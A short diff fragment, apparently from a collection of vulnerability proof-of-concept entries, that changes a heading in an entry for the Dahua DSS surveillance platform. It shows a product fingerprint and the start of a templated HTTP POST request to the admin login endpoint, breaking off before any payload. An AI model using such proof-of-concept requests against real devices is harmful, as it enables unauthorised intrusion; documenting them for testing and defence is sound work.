@@ -6,7 +6,7 @@
 app="dahua-DSS"
 ```
 
-## poc
+## POC
 ```
 POST /admin/login_login.action HTTP/1.1
 Host: {{Hostname}}
